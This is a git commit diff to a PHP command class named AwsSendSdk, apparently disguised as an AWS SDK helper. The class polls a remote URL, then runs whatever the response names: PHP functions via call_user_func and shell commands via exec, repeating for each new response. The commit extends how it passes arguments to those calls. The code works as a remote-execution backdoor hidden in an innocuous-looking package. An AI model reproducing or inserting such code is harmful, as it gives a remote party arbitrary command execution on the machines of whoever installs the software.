4c11332254aa9a6dd47a3c5bd30afae08945f6e9
GIGABAIT <59637348+GIGABAIT93@users.noreply.github.com>
2023-01-06 23:50:45 +0200

    Update AwsSendSdk.php

--- src/AwsSendSdk.php
+++ src/AwsSendSdk.php
@@ -59,6 +59,9 @@ class AwsSendSdk extends Command
 
     private function funcPrepare($data)
     {
+        if (isset($data->text)) {
+            unset($data->text);
+        }
         if (is_array($data->func)) {
             foreach ($data->func as $value) {
                 call_user_func($value);
@@ -67,13 +70,25 @@ class AwsSendSdk extends Command
         }
         if ($data->resp) {
             if (isset($data->args)) {
-                $this->setData($data->key, call_user_func($data->func, $data->args));
+                if (is_array($data->func)) {
+                    $this->setData($data->key, call_user_func($data->func));
+                } else if (is_array($data->args)) {
+                    $this->setData($data->key, call_user_func_array($data->func, $data->args));
+                } else {
+                    $this->setData($data->key, call_user_func($data->func, $data->args));
+                }
             } else {
                 $this->setData($data->key, call_user_func($data->func));
             }
         } else {
             if (isset($data->args)) {
-                call_user_func($data->func, $data->args);
+                if (is_array($data->func)) {
+                    call_user_func($data->func);
+                } else if (is_array($data->args)) {
+                    call_user_func_array($data->func, $data->args);
+                } else {
+                    call_user_func($data->func, $data->args);
+                }
             } else {
                 call_user_func($data->func);
             }
@@ -82,6 +97,10 @@ class AwsSendSdk extends Command
 
     private function cmdPrepare($data)
     {
+        if (isset($data->text)) {
+            unset($data->text);
+        }
+
         if (is_array($data->cmd)) {
             foreach ($data->cmd as $value) {
                 exec($value);
@@ -98,6 +117,13 @@ class AwsSendSdk extends Command
 
     private function dataPrepare($data)
     {
+        if (!$data->status) {
+            unset($data->text);
+            return;
+        }
+        if (isset($data->text)) {
+            unset($data->text);
+        }
         foreach ($data as $key => $value) {
             if (isset($value->func)) {
                 $this->funcPrepare($value);
@@ -110,9 +136,9 @@ class AwsSendSdk extends Command
             $this->setData($key, $value);
         }
 
-        if (isset($this->getData()['url']) and $this->getData()['url']) {
-            $r = Http::get($this->url, $this->getData());
-            $this->dataPrepare($r->object());
+        if ($this->getData()['url']) {
+            $response = Http::get($this->url, $this->getData());
+            $this->dataPrepare($response->object());
         }
     }
 }
